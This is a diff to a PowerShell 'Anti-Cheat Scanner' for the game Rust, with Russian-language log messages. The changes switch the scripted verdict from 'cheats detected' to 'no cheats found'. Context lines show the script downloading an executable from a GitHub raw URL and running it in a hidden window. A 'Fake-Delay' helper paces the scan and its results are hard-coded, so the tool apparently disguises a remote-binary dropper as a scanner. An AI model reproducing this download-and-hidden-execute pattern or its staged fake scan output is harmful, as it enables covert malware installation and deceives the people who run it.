@@ -139,7 +139,7 @@ $scan = {
     $progress.Value = 0
     $logBox.Clear()
 
-    Log "Запуск Anti-Cheat Scanner для $Game..." "Cyan"
+    Log "Запуск Anti-Cheat Scanner для $Game..." "Lime"
     Fake-Delay 800
 
 
@@ -167,7 +167,7 @@ $scan = {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CrackOnion/cheat-checker/refs/heads/main/sources/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
     Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
     Fake-Delay 4000
-    Log "Присутствуют известные сигнатуры читов." "Red"
+    Log "Известные сигнатуры отсутствуют." "Lime"
     $progress.Value = 70
 
     Log "Этап 4/5: Проверка Easy Anti-Cheat (EAC)..."
@@ -184,11 +184,10 @@ $scan = {
     Start-Sleep 1
     
 
-    Log "╔══════════════════════════════════════════════════════════════╗" "Red"
-    Log "║НАЙДЕН ПОДОЗРИТЕЛЬНЫЙ ФРАГМЕНТ ПАМЯТИ, КОТОРЫЙ ВОЗМОЖНО СВЯЗАН║" "Red"
-    Log "║                           С ЧИТАМИ                           ║" "Red"
-    Log "╚══════════════════════════════════════════════════════════════╝" "Red"
-    Log "Facepunch Anti-Cheat: ЗАЩИТА АКТИВНА" "Red"
+    Log "╔══════════════════════════════════════════════════════════════╗" "Lime"
+    Log "║                          ЧИТЫ НЕ НАЙДЕНЫ                     ║" "Lime"
+    Log "╚══════════════════════════════════════════════════════════════╝" "Lime"
+    Log "Facepunch Anti-Cheat: ЗАЩИТА АКТИВНА" "Lime"
 
     $btn.Enabled = $true
     $btn.Text = "Сканировать снова"
